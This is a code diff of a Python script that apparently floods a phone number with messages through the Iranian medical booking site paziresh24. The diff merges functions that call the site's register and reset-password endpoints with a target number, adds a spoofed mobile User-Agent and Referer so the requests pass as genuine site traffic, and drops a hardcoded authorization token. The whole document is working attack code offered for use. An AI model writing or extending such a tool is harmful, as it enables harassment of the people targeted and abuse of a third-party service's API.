@@ -64,47 +64,31 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
-def paziresh24_register(phone):
-    url = "https://apigw.paziresh24.com/gozargah/register"
+def paziresh24(phone):
     headers = {
         "Accept": "application/json, text/plain, */*",
         "accept-timezone": "Asia/Tehran",
         "Content-Type": "application/json; charset=utf-8",
-        "Authorization": "Splunk cd46b97e-bf0d-46e4-ba7e-111c2f88291f"
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+        "Referer": "https://www.paziresh24.com/"
     }
-    json_data = {
-        "username": phone
+
+    urls = {
+        "register": "https://apigw.paziresh24.com/gozargah/register",
+        "reset": "https://apigw.paziresh24.com/gozargah/resetpassword"
     }
-    try:
-        response = requests.post(url, headers=headers, json=json_data, timeout=10)
-        if response.status_code == 200:
-            print(f"[+] paziresh24_register → Success for {phone}")
-        else:
-            print(f"[-] paziresh24_register → Failed ({response.status_code}) for {phone}")
-    except Exception as e:
-        print(f"[!] paziresh24_register → Error: {e}")
 
+    data = {"username": phone}
 
-def paziresh24_reset(phone):
-    url = "https://apigw.paziresh24.com/gozargah/resetpassword"
-    headers = {
-        "Accept": "application/json, text/plain, */*",
-        "accept-timezone": "Asia/Tehran",
-        "Content-Type": "application/json; charset=utf-8"
-    }
-    json_data = {
-        "username": phone
-    }
-    try:
-        response = requests.post(url, headers=headers, json=json_data, timeout=10)
-        if response.status_code == 200:
-            print(f"[+] paziresh24_reset → Success for {phone}")
-        else:
-            print(f"[-] paziresh24_reset → Failed ({response.status_code}) for {phone}")
-    except Exception as e:
-        print(f"[!] paziresh24_reset → Error: {e}")
-
-
+    for name, url in urls.items():
+        try:
+            r = requests.post(url, headers=headers, json=data, timeout=10)
+            if r.status_code == 200:
+                print(f"[+] paziresh24_{name} → Success for {phone}")
+            else:
+                print(f"[-] paziresh24_{name} → Failed ({r.status_code}) for {phone}")
+        except Exception as e:
+            print(f"[!] paziresh24_{name} → Error: {e}")
         
 
 
